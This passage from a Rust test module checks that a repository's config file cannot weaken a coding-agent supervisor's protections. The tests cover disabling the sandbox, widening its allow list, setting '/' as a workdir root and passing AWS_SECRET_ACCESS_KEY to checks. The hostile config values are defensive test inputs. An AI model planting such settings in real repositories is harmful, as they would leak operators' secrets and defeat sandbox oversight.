            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("mail.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_MAIL"),
                "names the operator escape hatch: {err}"
            );
        }
    }

    /// S1: a repo could otherwise silence the `zirv \u{25b8}` announcement
    /// channel -- including its own degradation notices -- for anyone
    /// running zirv there, with no operator-visible sign that it happened.
    #[test]
    fn a_repo_may_not_silence_the_announcement_channel() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nevents = false\n",
        )
        .expect("write");

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not silence the announcement channel")
            .to_string();
        assert!(err.contains("chrome.events"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_QUIET"),
            "names the operator escape hatch: {err}"
        );
    }

    #[test]
    fn the_operator_may_still_toggle_mail_delivery_and_the_announcement_channel() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_only.path());
        let env = env_map(&[
            ("ZIRV_CTX_MAIL", "false"),
            ("ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES", "9000"),
            ("ZIRV_CTX_QUIET", "true"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.mail.enabled, "the environment is the operator");
        assert_eq!(cfg.mail.max_delivered_bytes, 9000);
        assert!(!cfg.chrome.events);
    }

    #[test]
    fn memory_defaults_are_enabled_off_harvest_with_sane_caps() {
        let memory = MemoryConfig::default();
        assert!(memory.enabled, "the private memory bank is on by default");
        assert!(
            !memory.harvest,
            "automatic harvesting is off by default: remembering is a deliberate act"
        );
        assert_eq!(memory.max_entries, 50);
        assert_eq!(memory.max_entry_bytes, 512);
        assert_eq!(memory.max_injected_bytes, 2048);
        assert!(
            memory.shared_enabled,
            "the shared (repo-owned) scope is on by default too"
        );
        assert_eq!(memory.core_max_bytes, 2048);
        assert_eq!(memory.retrieval_max_bytes, 2048);
        assert_eq!(memory.retrieval_max_entries, 6);
        assert_eq!(
            memory.harvest_max_entries, 5,
            "one session's own harvest stays conservative by default"
        );
        assert_eq!(memory.harvest_max_bytes, 2048);
    }

    #[test]
    fn memory_env_overrides_every_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_MEMORY", "false"),
            ("ZIRV_CTX_MEMORY_HARVEST", "true"),
            ("ZIRV_CTX_MEMORY_MAX_ENTRIES", "9"),
            ("ZIRV_CTX_MEMORY_MAX_ENTRY_BYTES", "128"),
            ("ZIRV_CTX_MEMORY_MAX_INJECTED_BYTES", "999"),
            ("ZIRV_CTX_MEMORY_SHARED", "false"),
            ("ZIRV_CTX_MEMORY_CORE_MAX_BYTES", "1024"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_BYTES", "4096"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_ENTRIES", "3"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_ENTRIES", "2"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_BYTES", "256"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.memory.enabled);
        assert!(cfg.memory.harvest);
        assert_eq!(cfg.memory.max_entries, 9);
        assert_eq!(cfg.memory.max_entry_bytes, 128);
        assert_eq!(cfg.memory.max_injected_bytes, 999);
        assert!(!cfg.memory.shared_enabled);
        assert_eq!(cfg.memory.core_max_bytes, 1024);
        assert_eq!(cfg.memory.retrieval_max_bytes, 4096);
        assert_eq!(cfg.memory.retrieval_max_entries, 3);
        assert_eq!(cfg.memory.harvest_max_entries, 2);
        assert_eq!(cfg.memory.harvest_max_bytes, 256);
    }

    /// N4: `supervise.max_nudges` reads from its own env var like every
    /// other `supervise.*` key.
    #[test]
    fn max_nudges_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_MAX_NUDGES", "7")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_nudges, 7);
    }

    /// Unlike `supervise.on_failure` (a shell command) or `agent_bin` (a
    /// binary), `max_nudges` names no binary, shell command, or model
    /// choice -- only how many times a session tolerates being interrupted
    /// -- so a repository checkout may set it, the same trust level a repo's
    /// `score.*` tuning already has.
    #[test]
    fn a_repository_config_may_set_max_nudges() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[supervise]\nmax_nudges = 5\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_nudges, 5);
    }

    /// Issue #155, Phase 5(e): the deprecated `ZIRV_CTX_SUPERVISE_MAX_HEAVY_
    /// WORKERS` env var still sets the renamed `max_heavy_operations` key --
    /// the same alias treatment the deprecated TOML key gets, so an
    /// operator's existing shell profile keeps working across the upgrade.
    #[test]
    fn max_heavy_workers_env_override_sets_the_new_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_MAX_HEAVY_WORKERS", "4")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_heavy_operations, 4);
    }

    /// The renamed key reads from its own env var like every other
    /// `supervise.*` key.
    #[test]
    fn max_heavy_operations_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_MAX_HEAVY_OPERATIONS", "4")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_heavy_operations, 4);
    }

    /// Issue #155, Phase 5(e): `supervise.max_heavy_workers` is renamed to
    /// `max_heavy_operations`. The old spelling must still PARSE, not merely
    /// be documented: `CtxConfig`'s structs are `deny_unknown_fields`, an
    /// installed older binary hard-errors on an unknown key, and an
    /// operator's existing `~/.zirv/ctx.toml` has to keep working across the
    /// upgrade in both directions.
    #[test]
    fn the_deprecated_max_heavy_workers_alias_still_sets_the_new_key() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nmax_heavy_workers = 2\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("repo");
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert_eq!(cfg.supervise.max_heavy_operations, 2);
    }

    /// The new spelling wins when both are present -- an operator mid-
    /// migration must not get the old value silently.
    #[test]
    fn the_new_key_wins_over_the_deprecated_alias() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nmax_heavy_workers = 2\nmax_heavy_operations = 4\n",
        )
        .expect("write");

        let repo = tempfile::tempdir().expect("repo");
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert_eq!(cfg.supervise.max_heavy_operations, 4);
    }

    /// Both spellings stay `REPO_FORBIDDEN`: a checked-out repo raising the
    /// machine-wide concurrency budget is the exact case issue #133's BSOD
    /// incident created it for, and a renamed key must not become a hole.
    #[test]
    fn neither_spelling_may_come_from_a_repo_layer() {
        for key in ["max_heavy_operations", "max_heavy_workers"] {
            let repo = tempfile::tempdir().expect("repo");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv").join(CTX_CONFIG_FILE),
                format!("[supervise]\n{key} = 8\n"),
            )
            .expect("write");
            let empty: HashMap<String, String> = HashMap::new();
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo layer must be rejected");
            assert!(err.to_string().contains(key), "got {err}");
        }
    }

    /// Issue #267: the writer pool's own cap reads from its own env var
    /// like every other `supervise.*` key.
    #[test]
    fn max_writers_env_override_sets_the_key() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_SUPERVISE_MAX_WRITERS", "3")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.supervise.max_writers, 3);
    }

    /// Issue #267: `max_writers` is `REPO_FORBIDDEN`, same reasoning as
    /// `max_heavy_operations` -- a checked-out repo must not be able to
    /// raise the machine-wide writer-concurrency budget.
    #[test]
    fn max_writers_may_not_come_from_a_repo_layer() {
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nmax_writers = 8\n",
        )
        .expect("write");
        let empty: HashMap<String, String> = HashMap::new();
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo layer must be rejected");
        assert!(err.to_string().contains("max_writers"), "got {err}");
    }

    /// Unlike `max_heavy_operations`, `heavy_command_patterns` is not
    /// `REPO_FORBIDDEN`: a repo may ADD a pattern (only ever narrowing, per
    /// the field's own doc comment), but a plain deep merge would let a
    /// repo's array -- including an empty one -- silently REPLACE the
    /// operator's home-layer list instead of adding to it. Proves the union,
    /// end to end through `CtxConfig::load`, the same way
    /// `sandbox_extra_deny_unions_the_operators_and_the_repos_own_entries`
    /// proves it for `extra_deny`.
    #[test]
    fn repo_heavy_command_patterns_are_added_not_replaced() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nheavy_command_patterns = [\"npm run build*\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nheavy_command_patterns = []\n",
        )
        .expect("write");

        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            cfg.supervise
                .heavy_command_patterns
                .contains(&"npm run build*".to_string()),
            "an empty repo array must not erase the operator's own pattern: {:?}",
            cfg.supervise.heavy_command_patterns
        );

        let repo2 = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo2.path().join(".zirv").join(CTX_CONFIG_FILE),
            "[supervise]\nheavy_command_patterns = [\"yarn build*\"]\n",
        )
        .expect("write");
        let cfg2 = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            cfg2.supervise
                .heavy_command_patterns
                .contains(&"npm run build*".to_string()),
            "the operator's own pattern must survive: {:?}",
            cfg2.supervise.heavy_command_patterns
        );
        assert!(
            cfg2.supervise
                .heavy_command_patterns
                .contains(&"yarn build*".to_string()),
            "the repo's own addition must land too: {:?}",
            cfg2.supervise.heavy_command_patterns
        );
    }

    /// S1-class boundary, same rationale as `prompt.max_repo_bytes` and
    /// `mail.max_delivered_bytes`: a repo checkout must not be able to seed
    /// the bank, grow its own cap, switch automatic harvesting on, or switch
    /// its own shared scope back on for anyone who runs zirv there.
    #[test]
    fn a_repository_config_may_not_raise_a_memory_cap_or_enable_harvesting() {
        for (key, value) in [
            ("enabled", "true"),
            ("harvest", "true"),
            ("max_entries", "100000"),
            ("max_entry_bytes", "100000"),
            ("max_injected_bytes", "100000"),
            ("shared_enabled", "true"),
            ("core_max_bytes", "100000"),
            ("retrieval_max_bytes", "100000"),
            ("retrieval_max_entries", "100000"),
            ("harvest_max_entries", "100000"),
            ("harvest_max_bytes", "100000"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[memory]\n{key} = {value}\n"),
            )
            .expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("memory.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_MEMORY"),
                "names the operator escape hatch: {err}"
            );
        }
    }

    #[test]
    fn the_operator_may_still_set_memory_keys() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_only.path());
        let env = env_map(&[
            ("ZIRV_CTX_MEMORY", "false"),
            ("ZIRV_CTX_MEMORY_MAX_ENTRIES", "5"),
            ("ZIRV_CTX_MEMORY_SHARED", "false"),
            ("ZIRV_CTX_MEMORY_CORE_MAX_BYTES", "512"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_BYTES", "1024"),
            ("ZIRV_CTX_MEMORY_RETRIEVAL_MAX_ENTRIES", "2"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_ENTRIES", "3"),
            ("ZIRV_CTX_MEMORY_HARVEST_MAX_BYTES", "512"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.memory.enabled, "the environment is the operator");
        assert!(
            !cfg.memory.shared_enabled,
            "including the shared-scope gate"
        );
        assert_eq!(cfg.memory.max_entries, 5);
        assert_eq!(cfg.memory.core_max_bytes, 512);
        assert_eq!(cfg.memory.retrieval_max_bytes, 1024);
        assert_eq!(cfg.memory.retrieval_max_entries, 2);
        assert_eq!(cfg.memory.harvest_max_entries, 3);
        assert_eq!(cfg.memory.harvest_max_bytes, 512);
    }

    #[test]
    fn dash_defaults_are_on_with_a_24_col_sidebar() {
        let cfg = CtxConfig::default();
        assert!(cfg.dash.enabled);
        assert_eq!(cfg.dash.sidebar_cols, 24);
        assert_eq!(cfg.dash.roster_max_age_secs, 604_800);
        assert_eq!(
            cfg.dash.max_panes, 9,
            "the default cap matches Ctrl+A 1..9 addressing"
        );
        assert!(
            cfg.dash.mouse,
            "the wheel scrolls a pane's scrollback out of the box"
        );
        assert_eq!(cfg.dash.idle_quiet_ms, 10_000);
    }

    /// Unlike every other `dash.*` key, `idle_quiet_ms` is a pure timing knob
    /// over a session the operator already chose to run in the dashboard --
    /// the same class of decision `pace.soft_percent` is -- so a repo checkout
    /// may set it, same as `chat.model`.
    #[test]
    fn a_repository_config_may_set_dash_idle_quiet_ms() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[dash]\nidle_quiet_ms = 5000\n",
        )
        .expect("write");

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.dash.idle_quiet_ms, 5000);
    }

    #[test]
    fn env_overrides_dash_idle_quiet_ms() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_DASH_IDLE_QUIET_MS", "2500")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.dash.idle_quiet_ms, 2500);
    }

    #[test]
    fn repo_layer_cannot_touch_dash_keys() {
        for (key, value) in [
            ("enabled", "false"),
            ("sidebar_cols", "80"),
            ("roster_max_age_secs", "1"),
            ("max_panes", "999"),
            ("mouse", "false"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[dash]\n{key} = {value}\n"),
            )
            .expect("write");

            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("dash.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_DASH"),
                "names the operator escape hatch: {err}"
            );
        }
    }

    /// Bug B (harness/model parity, 2026-08-22, fix round 2): a repo
    /// checkout must not be able to turn its own sandboxing off. `sandbox.
    /// enabled` gates `AgentAdapter::default_sandbox_args()` on every
    /// adapter -- for claude that means the whole generated `SHIPPED_
    /// POSTURE_ALLOW`/`_DENY` set (see `adapters/mod.rs`), not merely a
    /// `--permission-mode` flag, so a repo widening this key would strip
    /// the operator's own default protection wholesale, end to end.
    #[test]
    fn repo_layer_cannot_touch_sandbox_keys() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nenabled = false\n",
        )
        .expect("write");

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set this key")
            .to_string();
        assert!(err.contains("sandbox.enabled"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_SANDBOX"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Issue #329: the subprocess env scrub is off by default (it strips
    /// `SSH_AUTH_SOCK` and forces the permission mode to `default`), only
    /// the operator may turn it on, and the environment is the final word.
    #[test]
    fn subprocess_env_scrub_is_off_by_default_and_operator_only() {
        assert!(!SandboxConfig::default().scrub_subprocess_env);

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nscrub_subprocess_env = true\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set this key")
            .to_string();
        assert!(err.contains("sandbox.scrub_subprocess_env"), "got {err}");

        std::fs::remove_file(repo.path().join(".zirv/ctx.toml")).expect("remove");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[sandbox]\nscrub_subprocess_env = true\n",
        )
        .expect("write");
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");
        assert!(
            cfg.sandbox.scrub_subprocess_env,
            "the operator layer may turn it on"
        );

        let env = env_map(&[("ZIRV_CTX_SANDBOX_SCRUB_SUBPROCESS_ENV", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("loads");
        assert!(
            !cfg.sandbox.scrub_subprocess_env,
            "the environment wins outright"
        );
    }

    /// The end-to-end path the coordinator asked for: even if the hard
    /// rejection above were ever weakened to a narrow-only fold instead (the
    /// shape most other `[policy]`-adjacent keys use), the resolved config
    /// must still carry the operator's own `true` through to the actual
    /// generated argv on both adapters -- not just to a boolean field
    /// nothing downstream reads.
    #[test]
    fn a_repo_widening_attempt_on_sandbox_enabled_never_reaches_either_adapters_argv() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nenabled = false\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);

        // The repo file alone is a hard load error (see the test above);
        // simulate what a caller degraded to the operator-only layers would
        // see instead (`config::degrade_to_operator_only`, the same
        // fail-closed path `optimize.rs`/`hook.rs` already take on an
        // unreadable repo config) -- `cfg.sandbox` still defaults `true`.
        let cfg = super::degrade_to_operator_only(&|k| empty.get(k).cloned());
        assert!(cfg.sandbox.enabled);
        use super::super::adapters::AgentAdapter;
        let claude = super::super::adapters::claude::ClaudeAdapter::new(None);
        assert!(
            claude
                .default_sandbox_args(
                    &Default::default(),
                    &Default::default(),
                    super::super::adapters::LaunchMode::Headless,
                )
                .iter()
                .any(|a| a.starts_with("--allowedTools=")),
            "the generated permission set must still reach the argv"
        );
    }

    /// Fix round 3 (2026-08-22): `sandbox.extra_allow` is operator-only, the
    /// same asymmetry as every other whole-key `REPO_FORBIDDEN` entry -- a
    /// repo checkout adding to the allow list would be a privilege
    /// *widening*, not the narrowing a repo layer is otherwise permitted.
    #[test]
    fn repo_layer_cannot_add_sandbox_extra_allow_entries() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_allow = [\"Bash(deploy *)\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen the allow list")
            .to_string();
        assert!(err.contains("sandbox.extra_allow"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_SANDBOX_EXTRA_ALLOW"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Security review (2026-08-31): `dash.workdir_roots` is operator-only,
    /// the same widening-only asymmetry `repo_layer_cannot_add_sandbox_
    /// extra_allow_entries` above pins for `sandbox.extra_allow` -- a repo
    /// checkout naming a root here would let its own compromised pane obtain
    /// write authority over any directory under it, defeating the whole
    /// point of confining pane `--workdir` in the first place.
    #[test]
    fn repo_layer_cannot_set_dash_workdir_roots() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[dash]\nworkdir_roots = [\"/\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen its own pane's workdir roots")
            .to_string();
        assert!(err.contains("dash.workdir_roots"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_DASH_WORKDIR_ROOTS"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Issue #233: `workflow.check_env_passthrough` is operator-only, the
    /// identical widening-only asymmetry `repo_layer_cannot_add_sandbox_
    /// extra_allow_entries` above pins for `sandbox.extra_allow` -- a repo
    /// checkout naming a variable here would let its own `verify.toml`
    /// checks read it out of the operator's process environment.
    #[test]
    fn repo_layer_cannot_set_workflow_check_env_passthrough() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\ncheck_env_passthrough = [\"AWS_SECRET_ACCESS_KEY\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen the check-env passthrough allowlist")
            .to_string();
        assert!(err.contains("workflow.check_env_passthrough"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Issue #235: `workflow.review_worker_budget_tokens`/
    /// `review_worker_max_tool_calls` are operator-only, same asymmetry as
    /// `check_env_passthrough` above.
    #[test]
    fn repo_layer_cannot_set_workflow_review_worker_budget_keys() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nreview_worker_budget_tokens = 999999\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set its own reviewer worker token budget")
            .to_string();
        assert!(
            err.contains("workflow.review_worker_budget_tokens"),
            "got {err}"
        );
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_BUDGET_TOKENS"),
            "names the operator escape hatch: {err}"
        );

        let repo2 = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo2.path().join(".zirv/ctx.toml"),
            "[workflow]\nreview_worker_max_tool_calls = 999\n",
        )
        .expect("write");
        let err2 = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set its own reviewer worker tool-call ceiling")
            .to_string();
        assert!(
            err2.contains("workflow.review_worker_max_tool_calls"),
            "got {err2}"
        );
        assert!(
            err2.contains("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_MAX_TOOL_CALLS"),
            "names the operator escape hatch: {err2}"
        );
    }

    /// Issue #242: `workflow.auto_spawn_on_gate` is operator-only, same
    /// asymmetry as `check_env_passthrough` above.
    #[test]
    fn repo_layer_cannot_set_workflow_auto_spawn_on_gate() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nauto_spawn_on_gate = true\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not turn on its own auto-spawn")
            .to_string();
        assert!(err.contains("workflow.auto_spawn_on_gate"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_AUTO_SPAWN_ON_GATE"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Issue #268: `workflow.allow_empty_verify` is operator-only, same
    /// asymmetry as `auto_spawn_on_gate` above -- a repo checkout must not
    /// be able to declare its own missing/empty `verify.toml` a pass.
    #[test]
    fn repo_layer_cannot_set_workflow_allow_empty_verify() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nallow_empty_verify = true\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not declare its own empty verify.toml a pass")
            .to_string();
        assert!(err.contains("workflow.allow_empty_verify"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_ALLOW_EMPTY_VERIFY"),
            "names the operator escape hatch: {err}"
        );
    }

    /// The operator's home layer and `ZIRV_CTX_*` env override still work,
    /// same as `auto_spawn_on_gate`.
    #[test]
    fn the_operator_may_set_workflow_allow_empty_verify_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow]\nallow_empty_verify = true\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(cfg.workflow.allow_empty_verify);

        let env = env_map(&[("ZIRV_CTX_WORKFLOW_ALLOW_EMPTY_VERIFY", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.workflow.allow_empty_verify);
    }

    /// The operator's home layer and `ZIRV_CTX_*` env override still work,
    /// same as `check_env_passthrough`.
    #[test]
    fn the_operator_may_set_workflow_review_worker_budget_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
